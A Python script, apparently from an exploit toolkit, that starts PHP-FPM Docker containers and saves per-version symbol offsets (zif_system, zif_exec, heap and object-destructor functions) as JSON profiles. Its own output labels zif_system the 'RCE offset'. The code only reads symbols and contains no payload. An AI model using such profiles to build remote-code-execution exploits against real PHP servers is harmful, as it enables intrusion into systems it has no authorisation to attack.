#!/usr/bin/env python3
"""
FPM offset extractor — spins up a matching PHP-FPM Docker container,
extracts libphp/zif_system/zend_object_handlers offsets, writes a profile.

Usage:
  python3 offsets_fpm.py 8.1.34    → profiles/fpm-php-8.1.34.json
  python3 offsets_fpm.py 8.4.26    → profiles/fpm-php-8.4.26.json
"""

import json
import os
import re
import subprocess
import sys
import tempfile

PROFILES_DIR = os.path.join(os.path.dirname(__file__), "profiles")


def run(cmd, **kw):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300, **kw)
    return r.stdout.strip(), r.stderr.strip(), r.returncode


def extract_offsets(php_version):
    """
    1. Pull php:<version>-fpm image
    2. Find libphp.so / the PHP binary
    3. Use nm/objdump to extract symbol offsets
    4. Write profile JSON
    """
    image = f"php:{php_version}-fpm"
    container = f"sp-offsets-fpm-{php_version.replace('.', '')}"

    print(f"[1] Pulling {image}...")
    out, err, rc = run(f"docker pull {image}")
    if rc != 0:
        print(f"    FAILED: {err}")
        return None

    print(f"[2] Starting container...")
    run(f"docker rm -f {container} 2>/dev/null")
    out, err, rc = run(f"docker run -d --name {container} {image}")
    if rc != 0:
        print(f"    FAILED: {err}")
        return None

    try:
        # Find the PHP binary and libphp
        print(f"[3] Locating PHP binary and shared objects...")

        # PHP-FPM binary
        out, _, _ = run(f"docker exec {container} which php-fpm")
        php_fpm_bin = out.strip() or "/usr/local/sbin/php-fpm"

        # Check if libphp is a shared object or statically linked
        out, _, _ = run(f"docker exec {container} ldd {php_fpm_bin} 2>/dev/null")
        libphp_path = None
        if "libphp" in out:
            for line in out.split("\n"):
                if "libphp" in line:
                    m = re.search(r"=> (/\S+)", line)
                    if m:
                        libphp_path = m.group(1)
                        break

        # If no libphp.so, symbols are in the binary itself
        target_bin = libphp_path or php_fpm_bin
        print(f"    Target binary: {target_bin}")

        # Install binutils for nm/objdump
        print(f"[4] Installing binutils...")
        run(f"docker exec {container} bash -c 'apt-get update -qq && apt-get install -y -qq binutils 2>/dev/null'")

        # Extract key symbol offsets
        print(f"[5] Extracting symbol offsets...")
        symbols_needed = [
            "zif_system",
            "zif_exec",
            "zif_passthru",
            "zif_shell_exec",
            "php_exec_ex",
            "zend_object_std_dtor",
            "zend_objects_destroy_object",
            "zend_mm_alloc_heap",
            "_zend_bailout",
            "php_session_rfc1867_callback",
            "zend_hash_str_find",
            "zval_ptr_dtor",
            "php_var_serialize_intern",
        ]

        out, _, _ = run(f"docker exec {container} nm -D {target_bin} 2>/dev/null")
        if not out:
            # Try without -D (static symbols)
            out, _, _ = run(f"docker exec {container} nm {target_bin} 2>/dev/null")

        offsets = {}
        for line in out.split("\n"):
            parts = line.split()
            if len(parts) >= 3:
                addr, typ, name = parts[0], parts[1], parts[2]
                if name in symbols_needed:
                    offsets[name] = int(addr, 16)

        # Get base address info
        out_file, _, _ = run(f"docker exec {container} readelf -h {target_bin} 2>/dev/null")
        entry_point = None
        for line in out_file.split("\n"):
            if "Entry point" in line:
                m = re.search(r"0x([0-9a-fA-F]+)", line)
                if m:
                    entry_point = int(m.group(1), 16)

        # Get PHP build info
        out_ver, _, _ = run(f"docker exec {container} php-fpm -v 2>/dev/null")
        out_ini, _, _ = run(f"docker exec {container} php-fpm -i 2>/dev/null | grep -E 'memory_limit|session.upload_progress|Server API'")

        profile = {
            "php_version": php_version,
            "sapi": "fpm",
            "image": image,
            "target_binary": target_bin,
            "is_shared_lib": libphp_path is not None,
            "entry_point": hex(entry_point) if entry_point else None,
            "offsets": {name: hex(addr) for name, addr in offsets.items()},
            "symbols_found": len(offsets),
            "symbols_needed": len(symbols_needed),
            "build_info": out_ver.split("\n")[0] if out_ver else None,
            "notes": out_ini[:500] if out_ini else None,
        }

        # Compute relative offsets (from binary base)
        if offsets.get("zif_system") and entry_point:
            profile["relative_offsets"] = {
                name: hex(addr - entry_point) for name, addr in offsets.items()
            }

        # Write profile
        os.makedirs(PROFILES_DIR, exist_ok=True)
        out_path = os.path.join(PROFILES_DIR, f"fpm-php-{php_version}.json")
        with open(out_path, "w") as f:
            json.dump(profile, f, indent=2)
        print(f"\n[+] Profile written: {out_path}")
        print(f"    Symbols found: {len(offsets)}/{len(symbols_needed)}")
        if "zif_system" in offsets:
            print(f"    zif_system: {hex(offsets['zif_system'])}")
        else:
            print(f"    WARNING: zif_system not found — RCE offset missing")
        return profile

    finally:
        print(f"\n[6] Cleaning up container...")
        run(f"docker rm -f {container}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <php-version>")
        print(f"Example: {sys.argv[0]} 8.1.34")
        sys.exit(1)
    extract_offsets(sys.argv[1])
